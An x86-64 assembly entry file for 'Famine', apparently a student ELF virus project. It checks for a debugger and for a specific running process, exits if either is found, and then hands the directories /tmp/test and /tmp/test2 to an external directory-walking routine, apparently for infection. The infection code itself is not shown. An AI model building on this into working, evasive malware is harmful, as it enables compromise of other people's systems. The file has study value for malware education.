section .text

global	_start

extern	_checkdbg
extern	_checkproc
extern	_readdir

%define sys_write		1
%define sys_open		2
%define sys_getdents64	217

%define	DT_DIR			4
%define	DT_REG			8

_dirname_1:
	.string db '/tmp/test', 0
	.length equ $ - _dirname_1.string

_dirname_2:
	.string db '/tmp/test2', 0
	.length equ $ - _dirname_2.string

_signature:
	.string db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
	.length equ $ - _signature.string

;; -----------------------------------------------------------------------------------
;; Main entry point
;; -----------------------------------------------------------------------------------
_start:
	enter	16, 0

_push_all_regs:
	push	rbx
	push	rcx
	push	rdx
	push	rsi
	push	rdi
	push	r8
	push	r9
	push	r10
	push	r11
	push	r12
	push	r13
	push	r14
	push	r15

	;; Check if program was launched into debugger
	call	_checkdbg
	cmp		rax, 1
	je		_force_exit

	;; Check if specific program is running
	call	_checkproc
	cmp		rax, 1
	je		_force_exit
	
	;; Copy /tmp/test path under %rsp
	lea		rsi, [rel _dirname_1.string]
	mov		rdi, rsp
	sub		rdi, _dirname_1.length
	sub		rdi, 1
	mov		rcx, _dirname_1.length
	cld
	rep		movsb
	mov		byte [rdi], 0

	;; Move %rsp down by size of the path + 1
	sub		rsp, _dirname_1.length
	sub		rsp, 1
	mov		rax, 0
	push	rax

	call	_readdir

	;; Restore %rsp
	pop		rax
	add		rsp, _dirname_1.length
	add		rsp, 1

	;; Copy /tmp/test2 path under %rsp
	lea		rsi, [rel _dirname_2.string]
	mov		rdi, rsp
	sub		rdi, _dirname_2.length
	sub		rdi, 1
	mov		rcx, _dirname_2.length
	cld
	rep		movsb
	mov		byte [rdi], 0

	;; Move %rsp down by size of the path + 1
	sub		rsp, _dirname_2.length
	sub		rsp, 1
	mov		rax, 0
	push	rax

	call	_readdir

	;; Restore %rsp
	pop		rax
	add		rsp, _dirname_2.length
	add		rsp, 1

_pop_all_regs:
	;; Pop off the stack all the registers
	pop		r15
	pop		r14
	pop		r13
	pop		r12
	pop		r11
	pop		r10
	pop		r9
	pop		r8
	pop		rdi
	pop		rsi
	pop		rdx
	pop		rcx
	pop		rbx
	leave
	
	lea		rax, [rel _force_exit]
	jmp		[rax]

_force_exit:
	mov		rax, 60
	mov		rdi, 0
	syscall
